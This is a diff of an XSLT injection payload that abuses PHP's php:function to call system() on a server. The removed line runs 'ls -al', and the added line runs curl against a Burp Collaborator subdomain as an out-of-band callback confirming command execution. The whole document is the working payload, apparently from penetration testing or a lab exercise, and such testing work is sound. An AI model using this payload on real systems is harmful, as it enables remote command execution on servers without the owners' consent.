@@ -2,7 +2,7 @@
 <xsl:template match="/">
 
 
-    <xsl:value-of select="php:function('system','ls -al')"/>
+    <xsl:value-of select="php:function('system','curl upnybcegu48sihyjwvp5f9st3k9axz.burpcollaborator.net')"/>
     
     </xsl:template>
 </xsl:stylesheet>
